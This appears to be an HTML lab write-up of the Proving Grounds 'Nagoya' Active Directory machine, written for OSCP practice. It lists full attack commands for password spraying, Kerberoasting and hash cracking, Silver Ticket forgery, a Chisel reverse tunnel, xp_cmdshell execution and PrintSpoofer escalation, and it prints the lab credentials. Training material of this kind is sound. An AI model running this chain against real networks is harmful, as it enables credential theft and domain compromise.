@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta name="description" content="Proving Grounds Nagoya Writeup - Rachel Murphy" />
+  <title>PG: Nagoya | Rachel Murphy</title>
+
+  <!-- Base site styling -->
+  <link rel="stylesheet" href="/assets/css/writeups.css">
+  <style>
+    /* small local adjustments for screenshots & code blocks */
+    img.screenshot {
+      max-width: 100%;
+      margin: 0.75rem 0;
+      border: 2px solid #39ff14;
+      border-radius: 6px;
+      display: block;
+    }
+    .code-block { margin: 1rem 0; }
+    pre { background: rgba(15,23,36,0.9); padding: 1rem; border-radius: 6px; overflow-x: auto; }
+    .meta { color: #cbd5e1; font-size: 0.95rem; margin-bottom: .5rem; }
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <header>
+    <div class="wrap">
+      <h1>Nagoya — Writeup</h1>
+      <p class="meta">Proving Grounds — Active Directory</p>
+      <nav>
+        <ul class="main-nav">
+          <li><a href="/index.html">Home</a></li>
+          <li><a href="/writeups/index.html">Writeups</a></li>
+          <li><a href="/cheatsheets/cheatsheet.html">Cheatsheets</a></li>
+          <li><a href="/tools/index.html">Tools</a></li>
+          <li><a href="/about.html">About</a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+  <main class="wrap">
+    <!-- Machine summary / description -->
+    <section class="machine-summary">
+      <h2>Machine Overview</h2>
+      <p><strong>Difficulty:</strong> Hard</p>
+      <p><strong>Platform:</strong> Offensive Security Proving Grounds</p>
+      <p><strong>Description:</strong> The Nagoya virtual machine (VM) in Offensive Security's Proving Grounds is a challenging Active Directory environment designed for penetration testing practice. It is a popular target for those preparing for the Offensive Security Certified Professional (OSCP) exam.</p>
+
+      <h3>What makes Nagoya notable</h3>
+      <p>Active Directory environment: Unlike some simpler CTF-style boxes, Nagoya requires solid AD enumeration and exploitation technique knowledge. It's realistic and layered: Kerberos attacks, delegation misconfigurations, and privilege escalation opportunities mimic real corporate networks.</p>
+
+      <h3>Common techniques used on Nagoya</h3>
+      <ul>
+        <li>Reconnaissance: scanning for Kerberos (88), web (80), SMB and RDP.</li>
+        <li>Enumerating users: harvest usernames from web pages or shares.</li>
+        <li>Kerberoasting / AS-REP roasting: extract service ticket hashes and crack offline.</li>
+        <li>Port forwarding/tunneling: tools like Chisel or Ligolo are often required for reaching internal services.</li>
+        <li>Credential abuse: pass-the-hash, service account reuse, and BloodHound to map escalation paths.</li>
+      </ul>
+
+      <p class="meta">Featured on "TJ_Null's list" and frequently used for OSCP practice.</p>
+    </section>
+
+    <!-- NMAP -->
+    <section>
+      <h2>NMAP</h2>
+      <p>Initial host discovery and service enumeration to find exposed services and potential attack surfaces.</p>
+
+      <div class="code-block">
+        <pre>sudo nmap -sV -sC 192.168.194.21 -oN nmap-nagoya</pre>
+      </div>
+
+      <img class="screenshot" src="../images/Pasted image 20250708121500.png" alt="nmap initial output">
+      <p class="meta">Add the host to /etc/hosts to resolve the internal name during later steps.</p>
+
+      <img class="screenshot" src="../images/Pasted image 20250708121754.png" alt="added to hosts">
+      <p class="meta">Set an environment variable for convenience in scripts/commands:</p>
+
+      <div class="code-block">
+        <pre>vim ~/.bashrc
+export IP=192.168.194.21
+:wq
+source ~/.bashrc
+echo $IP</pre>
+      </div>
+
+      <img class="screenshot" src="../images/Pasted image 20250708123016.png" alt="set env var">
+      <img class="screenshot" src="../images/Pasted image 20250708123230.png" alt="echo ip">
+    </section>
+
+    <!-- SMB -->
+    <section>
+      <h2>SMB</h2>
+      <p>Quick check of anonymous and authenticated SMB access. SMB is frequently useful for discovering script files, shares like SYSVOL, and files containing credentials.</p>
+
+      <img class="screenshot" src="../images/Pasted image 20250708122630.png" alt="smb check 1">
+      <p class="meta">Initial attempts may show limited or no anonymous listing.</p>
+
+      <img class="screenshot" src="../images/Pasted image 20250708123400.png" alt="smb check 2">
+      <img class="screenshot" src="../images/Pasted image 20250708123418.png" alt="smb check 3">
+    </section>
+
+    <!-- RPC -->
+    <section>
+      <h2>RPC</h2>
+      <p>Use rpcclient to enumerate shares, users, groups and service RIDs. Helpful to check for interesting accounts and privileges.</p>
+
+      <div class="code-block">
+        <pre>rpcclient -U '' $IP
+# or without password:
+rpcclient -U '' -N $IP</pre>
+      </div>
+
+      <img class="screenshot" src="../images/Pasted image 20250708132028.png" alt="rpcclient output">
+      <img class="screenshot" src="../images/Pasted image 20250708132059.png" alt="rpcclient list">
+    </section>
+
+    <!-- Web (Port 80) -->
+    <section>
+      <h2>Web (Port 80)</h2>
+      <p>Web application enumeration can reveal usernames, upload functionality, or directories that contain user lists. Use directory fuzzing to find hidden pages and user lists.</p>
+
+      <img class="screenshot" src="../images/Pasted image 20250708132208.png" alt="web landing page">
+      <div class="code-block">
+        <pre>feroxbuster -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</pre>
+      </div>
+      <img class="screenshot" src="../images/Pasted image 20250708133336.png" alt="ferox output">
+      <p class="meta">Found `/team` containing user information — good source for constructing username lists.</p>
+
+      <img class="screenshot" src="../images/Pasted image 20250708132524.png" alt="/team directory screenshot">
+      <p>Collected usernames (rough initial list):</p>
+      <img class="screenshot" src="../images/Pasted image 20250708133021.png" alt="usernames list snippet">
+      <p>Attempted username generation (FirstInitial.Last etc.) and validation via Kerbrute to build a better target list for password spraying and account checks.</p>
+      <img class="screenshot" src="../images/Pasted image 20250708134016.png" alt="generated usernames attempt">
+    </section>
+
+    <!-- Username validation & Password spray -->
+    <section>
+      <h2>Username validation & password spray</h2>
+      <p>Validate usernames and attempt a conservative password spray. The writeup mentions a working password 'Spring2023' — use targeted spraying carefully to avoid lockouts.</p>
+
+      <div class="code-block">
+        <pre>kerbrute userenum --dc $IP -d nagoya-industries.com new-users.txt
+# or use nxc to test many usernames:
+nxc smb $IP -u new-users.txt -p 'new-users.txt' --no-brute</pre>
+      </div>
+
+      <img class="screenshot" src="../images/Pasted image 20250708154400.png" alt="password spray">
+      <img class="screenshot" src="../images/Pasted image 20250708154300.png" alt="valid creds found">
+      <p class="meta">Discovered valid credentials: <code>craig.carr:Spring2023</code>.</p>
+
+      <img class="screenshot" src="../images/Pasted image 20250708154550.png" alt="shares listing">
+      <p>Access to SYSVOL or other shares can contain scripts or files useful for lateral movement or credential discovery.</p>
+
+      <img class="screenshot" src="../images/Pasted image 20250708154743.png" alt="sysvol listing">
+      <img class="screenshot" src="../images/Pasted image 20250708154843.png" alt="sysvol files">
+      <img class="screenshot" src="../images/Pasted image 20250708154929.png" alt="reset password dir">
+      <img class="screenshot" src="../images/Pasted image 20250708155007.png" alt="xml configs">
+      <p class="meta">Grabbed interesting files for later inspection.</p>
+    </section>
+
+    <!-- Finding svc_helpdesk secret -->
+    <section>
+      <h2>Extracting service account password</h2>
+      <p>Search for embedded secrets in files or binaries in shares. Sometimes executables contain plaintext or obfuscated credentials.</p>
+
+      <p class="meta">Downloaded and ran strings against <code>ResetPassword.exe</code> to extract a password for <code>svc_helpdesk</code>.</p>
+      <img class="screenshot" src="../images/Pasted image 20250708160221.png" alt="download resetpassword.exe">
+      <div class="code-block">
+        <pre>strings -e l ResetPassword.exe</pre>
+      </div>
+      <img class="screenshot" src="../images/Pasted image 20250708160456.png" alt="strings output with password">
+      <p class="meta">Found password for <code>svc_helpdesk</code>: <code>U299iYRmikYTHDbPbxPoYYfa2j4x4cdg</code>.</p>
+    </section>
+
+    <!-- Kerberoast & crack -->
+    <section>
+      <h2>GetUserSPNs / Kerberoasting</h2>
+      <p>Using impacket GetUserSPNs to request service tickets for service accounts (TGS), then cracking them offline with hashcat to recover plaintext passwords for service accounts (often mssql, http etc.).</p>
+
+      <div class="code-block">
+        <pre>impacket-GetUserSPNs -request -dc-ip 192.168.194.21 nagoya-industries.com/svc_helpdesk -save -outputfile GetUserSPNs.out</pre>
+      </div>
+
+      <img class="screenshot" src="../images/Pasted image 20250708161358.png" alt="getuserspns output">
+      <img class="screenshot" src="../images/Pasted image 20250708161506.png" alt="saved hashes">
+      <p class="meta">Crack TGS hashes using hashcat (mode 13100):</p>
+
+      <div class="code-block">
+        <pre>hashcat -m 13100 GetUserSPNs.out /usr/share/wordlists/rockyou.txt</pre>
+      </div>
+
+      <img class="screenshot" src="../images/Pasted image 20250708161642.png" alt="hashcat cracked">
+      <p class="meta">Recovered service credentials: <code>svc_mssql:Service1</code>.</p>
+
+      <div class="code-block">
+        <pre>nxc smb 192.168.194.21 -u 'svc_mssql' -p 'Service1'</pre>
+      </div>
+
+      <img class="screenshot" src="../images/Pasted image 20250708161840.png" alt="svc_mssql valid">
+    </section>
+
+    <!-- Bloodhound -->
+    <section>
+      <h2>BloodHound Enumeration</h2>
+      <p>Collect AD data with credentials you have, import into BloodHound, and look for attack paths: privileged groups, SID history, unconstrained delegation, SPNs, etc.</p>
+
+      <div class="code-block">
+        <pre>python3 bloodhound.py -d 'nagoya-industries.com' -u 'craig.carr' -p 'Spring2023' -c all -ns 192.168.194.21</pre>
+      </div>
+
+      <img class="screenshot" src="../images/Pasted image 20250708164205.png" alt="bloodhound collection">
+      <p class="meta">Mark compromised accounts as "owned" in your local BloodHound dataset to track your progress and identify privilege escalation candidates.</p>
+      <img class="screenshot" src="../images/Pasted image 20250708164455.png" alt="bloodhound owned user">
+    </section>
+
+    <!-- RPC password change & WinRM access -->
+    <section>
+      <h2>Change account password via RPC and WinRM</h2>
+      <p>With a service account that can reset other user's passwords (e.g. helpdesk), you can change a target user's password and directly access endpoints via WinRM or RDP.</p>
+
+      <div class="code-block">
+        <pre>net rpc password "christopher.lewis" "Password123" -U "nagoya-industries.com"/"svc_helpdesk"%"U299iYRmikYTHDbPbxPoYYfa2j4x4cdg" -S "192.168.194.21"</pre>
+      </div>
+
+      <img class="screenshot" src="../images/Pasted image 20250708165952.png" alt="rpc password change">
+      <p class="meta">Then login via Evil-WinRM as the target:</p>
+
+      <div class="code-block">
+        <pre>evil-winrm -i 192.168.194.21 -u "christopher.lewis" -p "Password123"</pre>
+      </div>
+
+      <img class="screenshot" src="../images/Pasted image 20250708165940.png" alt="evil-winrm shell">
+      <img class="screenshot" src="../images/Pasted image 20250708170018.png" alt="whoami as chris">
+      <img class="screenshot" src="../images/Pasted image 20250708170156.png" alt="no flag yet screenshot">
+      <p class="meta">If a direct shell fails or the service is restricted, look for alternative escalation vectors like Kerberos ticket attacks (Silver Ticket) or local service misconfigurations.</p>
+    </section>
+
+    <!-- Silver ticket -->
+    <section>
+      <h2>Privilege Escalation — Silver Ticket</h2>
+      <p>When you control a service account (e.g. svc_mssql) whose password you know, you can forge Kerberos service tickets (Silver Ticket) to impersonate high-privilege principals locally on services that accept the forged ticket.</p>
+
+      <h3>Preparation</h3>
+      <ol>
+        <li>Compute NT hash of the password (Service1 → NT hash).</li>
+        <li>Get domain SID (from BloodHound or Get-ADDomain).</li>
+        <li>Identify target SPN (e.g. MSSQL/nagoya.nagoya-industries.com).</li>
+      </ol>
+
+      <p class="meta">Example steps used:</p>
+      <div class="code-block">
+        <pre># generate NT hash (external tool / script)
+# use impacket-ticketer to create a service ticket
+impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid "S-1-5-21-1969309164-1513403977-1686805993" -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com Administrator
+
+# export ccache
+export KRB5CCNAME=$PWD/Administrator.ccache
+klist</pre>
+      </div>
+
+      <img class="screenshot" src="../images/Pasted image 20250708194904.png" alt="ticketer success">
+      <img class="screenshot" src="../images/Pasted image 20250708195035.png" alt="klist showing ticket">
+    </section>
+
+    <!-- Port forwarding and MSSQL interaction -->
+    <section>
+      <h2>Port forwarding (Chisel) & MSSQL</h2>
+      <p>The SQL service might bind to localhost only — use a reverse tunnel (Chisel/Ligolo) to forward local 1433 to your machine so mssql client tools can connect.</p>
+
+      <p class="meta">Kali side:</p>
+      <div class="code-block">
+        <pre>chisel server --port 445 --reverse</pre>
+      </div>
+
+      <p class="meta">Victim side:</p>
+      <div class="code-block">
+        <pre>.\chisel.exe client 192.168.45.152:445 R:1433:127.0.0.1:1433</pre>
+      </div>
+
+      <p>With the tunnel up you can run the mssql client and enable xp_cmdshell to execute commands on the host:</p>
+
+      <div class="code-block">
+        <pre># enable xp_cmdshell, then:
+xp_cmdshell &lt;command&gt;</pre>
+      </div>
+
+      <img class="screenshot" src="../images/Pasted image 20250708213157.png" alt="xp_cmdshell example">
+      <img class="screenshot" src="../images/Pasted image 20250708213436.png" alt="payload paste">
+      <img class="screenshot" src="../images/Pasted image 20250708213507.png" alt="xp_cmdshell execution">
+      <img class="screenshot" src="../images/Pasted image 20250708213550.png" alt="reverse shell caught">
+    </section>
+
+    <!-- Priv Esc: PrintSpoofer -->
+    <section>
+      <h2>Other Privilege Escalation (PrintSpoofer)</h2>
+      <p>If the environment allows, local privilege escalation via named pipe impersonation (PrintSpoofer) is another useful route to SYSTEM. Use the repo's x64 release for modern Windows hosts.</p>
+
+      <div class="code-block">
+        <pre>.\PrintSpoofer64.exe -i -c cmd</pre>
+      </div>
+
+      <img class="screenshot" src="../images/Pasted image 20250708213611.png" alt="printspoofer">
+      <p class="meta">PrintSpoofer exploits weak RPC privileges to run a command as SYSTEM — use with caution and only during authorized practice.</p>
+    </section>
+
+    <!-- Wrap up -->
+    <section>
+      <h2>Wrap up / Notes</h2>
+      <p>Nagoya combines web enumeration, SMB/Share analysis, Kerberos attacks, and AD privilege escalation. The common successful path is:</p>
+      <ol>
+        <li>Recon & find usernames from web or shares.</li>
+        <li>Password spray / harvest service account credentials.</li>
+        <li>Use GetUserSPNs/Rubeus to steal/obtain TGS hashes, crack them to get service account passwords.</li>
+        <li>Use the compromised service account to either change user passwords, perform Silver Ticket attacks, or enable remote command execution via MSSQL (with tunneling), then escalate to SYSTEM via service misconfig or exploitation (SeRestore/SeMachine privileges / PrintSpoofer).</li>
+      </ol>
+      <p class="meta">Always document findings, record commands and notes for remediation, and avoid noisy attacks on shared or production-like labs.</p>
+    </section>
+
+  </main>
+
+  <!-- Footer -->
+  <footer>
+    <div class="wrap site-footer">
+      <p>© Rachel Murphy 2025 | <a href="https://github.com/rachhavoc" target="_blank" rel="noopener">GitHub</a> | <a href="https://www.linkedin.com/in/rachelcmurphy/" target="_blank" rel="noopener">LinkedIn</a></p>
+      <p><a href="/writeups/index.html">Back to Writeups</a> | <a href="/index.html">Home</a></p>
+    </div>
+  </footer>
+
+</body>
+</html>
